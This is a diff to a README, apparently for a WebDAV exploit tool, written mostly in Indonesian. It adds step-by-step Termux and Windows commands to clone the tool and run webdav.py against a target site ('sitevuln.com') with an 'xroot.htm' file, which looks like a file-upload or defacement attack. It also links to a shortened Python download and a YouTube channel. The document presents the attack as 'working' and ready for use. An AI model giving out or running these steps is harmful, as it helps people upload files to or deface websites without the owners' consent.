@@ -1,8 +1,38 @@
-# webdav
+# Exploit Webdav Windows & Termux Working
 
-Eksekusi via Termux
+# Eksekusi via Termux
 
-python webdav.py sitevuln.com root.htm
+pkg update && pkg upgrade
+
+pkg install -y git python2 curl php wget 
+
+git clone https://github.com/boychongzen18/webdav.git
+
+cd webdav
+
+chmod +x webdav.py
+
+python2 webdav.py sitevuln.com xroot.htm
+
+================================================================================
+# Eksekusi via Window
+
+Download Python27 : https://shortid.co/bFWBm
+
+git clone https://github.com/boychongzen18/webdav.git
+
+cd webdav
+
+chmod 777 webdav.py
+
+python webdav.py sitevuln.com xroot.htm
+
+================================================================================
+
+
+
+
+
 
 My Youtube : https://www.youtube.com/channel/UCKdOPQ_iIXcqK17PB_2RMdQ
 
